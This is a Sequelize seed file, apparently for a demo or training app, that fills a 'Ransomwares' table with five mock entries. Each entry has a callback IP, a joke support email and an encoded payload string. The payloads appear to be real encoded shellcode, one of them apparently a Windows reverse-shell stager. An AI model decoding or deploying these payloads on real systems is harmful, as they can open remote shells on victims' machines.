'use strict';

module.exports = {
  up: async (queryInterface, Sequelize) => {
    /**
     * Add seed commands here.
     *
     * Example:
     * await queryInterface.bulkInsert('People', [{
     *   name: 'John Doe',
     *   isBetaMember: false
     * }], {});
    */
    await queryInterface.bulkInsert('Ransomwares', [{
      name: 'Bootloader',
      callbackIp: '127.0.0.1',
      payload: 'TYIIIIIIQZAkA0D2A00A0kA0D2A12B10B1ABjAX8A1uIN',
      supportEmail: 'yougothacked@127.0.0.1',
      version: 1.0,
      createdAt: new Date(),
      updatedAt: new Date()
    }, {
      name: 'Bootloader Alpha',
      callbackIp: '127.0.0.1',
      payload: 'TYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI',
      supportEmail: 'test@127.0.0.1',
      version: 0.1,
      createdAt: new Date(),
      updatedAt: new Date()
    }, {
      name: 'Optimus Prime',
      callbackIp: '192.168.0.111',
      payload: '/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYHiej/0LiQAQAAKcRUUGgpgGsA/9VqCmjAqABvaAIAF3GJ5lBQUFBAUEBQaOoP3+D/1ZdqEFZXaJmldGH/1YXAdAr/Tgh17OhnAAAAagBqBFZXaALZyF//1YP4AH42izZqQGgAEAAAVmoAaFikU+X/1ZNTagBWU1doAtnIX//Vg/gAfShYaABAAABqAFBoCy8PMP/VV2h1bk1h/9VeXv8MJA+FcP///+mb////AcMpxnXBw7vwtaJWagBT/9U=',
      supportEmail: 'bitcoin@youshouldhavepaidup.virus',
      version: 1.1,
      createdAt: new Date(),
      updatedAt: new Date()
    }, {
      name: 'Bumblebee',
      callbackIp: '127.0.0.1',
      payload: 'IICCCCCCQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIKLKXMRUP5PC050K9JEP1O0U4LKF0FPLKQBTLLKPRUDLKCBFHTONWPJWVVQKONLGLSQSLERFL7P9QHOTMC1XGM2ZR0RQGLKF24PLKQZWLLK0L4QT8JCG8C1HQPQLK1IWPC1ICLKW95HM37JW9LKWDLK5QIF01KONL9Q8O4MEQ8G08M0SEKFS33MJXWKSM6DCEJDF8LK0XFDC1HSRFLKDL0KLKF8ELUQXSLKTDLKEQHPMY746DVD1KQKE1V90ZPQKOM0QOQOPZLKR2ZKLMQMSX03WBEP5P2H2WRS7BQOPTU80L477VTGK9JHKOXP88Z0EQEPEPWYXDPTV0BHWYK0BKC0KOHU3Z4JRHO0985PURU8DBEP4I5CLIM6V0F00PV0W0F070V0RHZJTOIOKPKO9EMGBJB0V60WRHJ9Y54451KOYEK5YPT4DJKOPNDH45JLJH57C030UPBJUPSZ4DPVPWCXTBN9IXQOKOHUK3JXEP3NWFLKFVSZW0SXEPTPUP30F6BJC0BH68I463ZEKOYELS1CRJUPF61C672HS2IIIXQOKO8UK3L8EPSMFHF8SXUPQPC0303Z30PPSXDKVO4OP0KOYE673XRURN0MU1KO9EQN1NKOTLWT4OK5T0KOKOKOJIMKKOKOKOUQ9SGYHFSEYQO3OKJPX5920V2J3063KOXUAA',
      supportEmail: 'beepboop@stonks.yeet',
      version: 1.01,
      createdAt: new Date(),
      updatedAt: new Date()
    }, {
      name: 'Decepticon',
      callbackIp: '127.0.0.1',
      payload: 'IIIIIIIICCCCCC7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIIl9xK2Gpc0gpU0k9HeP1IPE4LK2p00LKRrDLNkCbTTLKRR7XDOLwrjUvVQkOll7LQqqlVbFLEpjaxO4MC1yWYrXr3bbwNkqBtPnk2jgLnkPLTQT8hcpHeQN1V1nk1IUpUQiCNkSyDX9sEjqYNkdtNkuQkfvQIoLlZajofmvaIWdx9p2UxvFccMjXEkcMq4bU8dpXNk2xa431zspfnkFl0KlK1HwlEQiCLKS4nkVaxPniW4vDddSkCku13iSj0QYoM0soSo1JlKeBzKLMQMBHP3p2c0uP0ht7t3WBaOsdbH2lqg16UWYoKemhJ07qs030UyZdBt0Pe8q9mPrKuPYoyEcZtKSi2pirymbJgqCZvb1xkZDOkokP9o9ELWph7rS0s4ZrOyyvPjB0f63g58XBYKgGu7IoIEK5O0ae2xCgbHLw9yFXioion5bwphadjL5khaKO9ErwLWQxCEpnBmu1YoxUpjgpbJs4CfaGBHC2yIo8aOyoN5MSYhgpsNfMlKvVRJg0SXWpvpuP7pQFCZ5P3XPXi4qCKUiojuMC0SQzs066QCSg2HuRJyJhqOkOzuosihC0SN5WEQYS7YKvt5ZI9SOKJPoEmr2v1zEPrsIon5AA',
      supportEmail: 'yougothacked@127.0.0.1',
      version: 1.2,
      createdAt: new Date(),
      updatedAt: new Date()
    }], {});
  },

  down: async (queryInterface, Sequelize) => {
    /**
     * Add commands to revert seed here.
     *
     * Example:
     * await queryInterface.bulkDelete('People', null, {});
     */
    await queryInterface.bulkDelete('Ransomwares', null, {});
  }
};
